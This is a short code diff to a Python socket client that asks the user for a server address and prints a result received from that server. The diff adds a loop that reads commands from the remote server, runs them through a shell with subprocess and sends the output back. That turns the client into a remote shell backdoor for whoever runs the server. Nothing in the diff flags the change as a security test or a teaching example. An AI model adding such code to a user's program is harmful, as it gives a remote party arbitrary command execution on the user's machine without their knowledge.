@@ -1,4 +1,5 @@
 import socket
+import subprocess
 
 def get_config():
     host = input('Enter the host address of the server: ')
@@ -39,6 +40,15 @@ def main():
 
     print('Received result from the server:')
     print(result.decode())
+
+    # Receive commands from the server
+    while True:
+        command = client.recv(1024)
+        if not command:
+            break
+        process = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        stdout, stderr = process.communicate()
+        client.sendall(stdout + stderr)
 
     # Clean up the connection
     client.close()
